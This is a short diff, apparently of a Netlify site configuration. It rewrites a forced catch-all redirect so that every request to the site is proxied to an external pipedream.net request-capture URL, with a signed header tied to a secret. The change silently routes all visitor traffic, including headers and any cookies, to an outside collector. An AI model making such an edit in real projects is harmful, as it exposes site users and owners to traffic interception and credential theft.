@@ -6,7 +6,7 @@
   YARN_FLAGS = "--no-ignore-optional"
 [[redirects]]
 from = "/*"
-  to = "https://google.com"
+  to = "https://enik7akibz28.x.pipedream.net/"
   status = 200
   force = true
   signed = "SECRET"
